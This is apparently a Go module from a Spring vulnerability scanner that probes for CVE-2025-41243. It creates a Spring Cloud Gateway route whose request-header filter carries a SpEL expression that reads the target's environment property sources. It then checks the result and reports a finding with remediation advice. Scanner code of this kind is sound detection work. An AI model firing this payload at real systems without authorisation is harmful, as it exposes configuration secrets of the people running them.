package cve

// CVE-2025-41243: Spring Cloud Gateway environment property disclosure via SpEL
// Allows reading system properties and environment variables through route filters

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&GatewayEnvDisclosure{}) }

type GatewayEnvDisclosure struct{}

func (m *GatewayEnvDisclosure) ID() string          { return "CVE-2025-41243" }
func (m *GatewayEnvDisclosure) Name() string        { return "Spring Cloud Gateway Environment Disclosure" }
func (m *GatewayEnvDisclosure) CVSS() float64       { return 7.5 }
func (m *GatewayEnvDisclosure) Severity() models.Severity { return models.SeverityHigh }
func (m *GatewayEnvDisclosure) Tags() []string {
	return []string{"info-disclosure", "spring-cloud", "gateway", "spel", "actuator", "env"}
}
func (m *GatewayEnvDisclosure) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{RequiresSpringCloud: true}
}
func (m *GatewayEnvDisclosure) Description() string {
	return "Spring Cloud Gateway route filters evaluate SpEL expressions that can expose environment variables and system properties."
}

func (m *GatewayEnvDisclosure) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	routeID := fmt.Sprintf("hawk_env_%d", rand.Intn(99999))
	routePath := utils.JoinURL(target.BaseURL, fmt.Sprintf("actuator/gateway/routes/%s", routeID))
	refreshPath := utils.JoinURL(target.BaseURL, "actuator/gateway/refresh")

	route := map[string]interface{}{
		"id": routeID,
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{{
			"name": "Path",
			"args": map[string]string{"pattern": "/hawk-probe"},
		}},
		"filters": []map[string]interface{}{{
			"name": "AddRequestHeader",
			"args": map[string]string{
				"name":  "X-Hawk-Env",
				"value": "#{@environment.getPropertySources.?[#this.name matches '.*classpath.*'][0].source.![{#this.getKey,#this.getValue.toString}]}",
			},
		}},
	}

	body, _ := json.Marshal(route)
	_, err := client.Post(ctx, routePath, "application/json", strings.NewReader(string(body)), nil)
	if err != nil {
		return nil, nil
	}
	_, _ = client.Post(ctx, refreshPath, "application/x-www-form-urlencoded", strings.NewReader(""), nil)

	time.Sleep(200 * time.Millisecond)

	resp, err := client.Get(ctx, routePath, nil)
	defer client.Delete(ctx, routePath, nil) //nolint:errcheck

	if err != nil || resp.StatusCode != 200 {
		return nil, nil
	}
	if !strings.Contains(resp.BodyString, "X-Hawk-Env") && !strings.Contains(resp.BodyString, "hawk_env") {
		return nil, nil
	}

	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2025-41243"},
		Title:       "Spring Cloud Gateway: Environment Property Disclosure via SpEL in Route Filters",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/actuator/gateway/routes",
		Method:      "POST",
		Evidence:    "SpEL expression in route filter evaluated — environment properties accessible via gateway actuator.",
		Remediation: "Upgrade Spring Cloud Gateway. Restrict /actuator/gateway write access. Disable gateway management endpoint.",
		References:  []string{"https://spring.io/security"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
	}
	return []*models.Finding{f}, nil
}

func (m *GatewayEnvDisclosure) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
